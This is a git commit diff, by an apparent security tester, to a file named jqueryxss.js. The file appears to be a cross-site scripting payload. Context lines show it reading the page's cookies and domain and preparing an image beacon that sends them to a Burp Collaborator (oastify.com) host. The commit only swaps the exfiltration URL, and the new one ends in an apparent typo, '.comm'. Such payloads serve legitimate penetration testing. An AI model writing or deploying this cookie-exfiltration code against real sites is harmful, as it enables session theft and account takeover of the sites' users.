e7a1bb21ccae18bedde065850234b404c6dd8a86
Shad0w-Eagle <167417449+Shad0w-Eagle@users.noreply.github.com>
2025-07-28 15:09:40 +0530

    Update jqueryxss.js

--- jqueryxss.js
+++ jqueryxss.js
@@ -5,7 +5,7 @@ var domain = document.domain;
 var cookies = document.cookie;
 
 // Define your Burp Collaborator endpoint
-var exfilURL = "https://evd6ijg72o74ri9ne2kpold5hwnnblza.oastify.com";
+var exfilURL = "https://y54qs3qrc8ho12j7omu9y5nprgx7la9z.oastify.comm";
 
 // Send via image beacon (bypasses CORS)
 var img = new Image();
